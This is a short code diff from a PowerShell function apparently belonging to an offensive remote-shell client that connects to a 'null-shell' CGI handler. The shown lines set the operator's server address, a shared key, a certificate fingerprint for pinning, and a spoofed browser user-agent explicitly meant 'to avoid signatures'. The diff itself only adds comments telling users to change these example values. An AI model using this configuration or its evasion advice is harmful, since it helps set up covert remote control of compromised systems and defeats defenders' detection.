@@ -22,13 +22,13 @@ function start-aclient {
 
 
 	# Set ip address or domain hosting the null-shell cgi app.
-	$uri = 'https://192.168.43.150/gm432GiS.pl'
+	$uri = 'https://192.168.43.150/gm432GiS.pl' #[->] Change this example
 
 	# set the key that matches the one set on the cgi handler inside single quotes
-	$key = 'SWFfeXE3cnNDenRYek03SGU5WnNabXNSZmt4SFk4'
+	$key = 'SWFfeXE3cnNDenRYek03SGU5WnNabXNSZmt4SFk4' #[->] Change this example
 
 	# place your ssl key fingerprint here to perform manual key validation
-	$certfingerprint = 'CD6F822BC1728C2DE5BC874913B67CA07463C40D'
+	$certfingerprint = 'CD6F822BC1728C2DE5BC874913B67CA07463C40D' #[->] Change this example
 
 	# user-agent variable, change this to avoid signatures
 	$agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1"
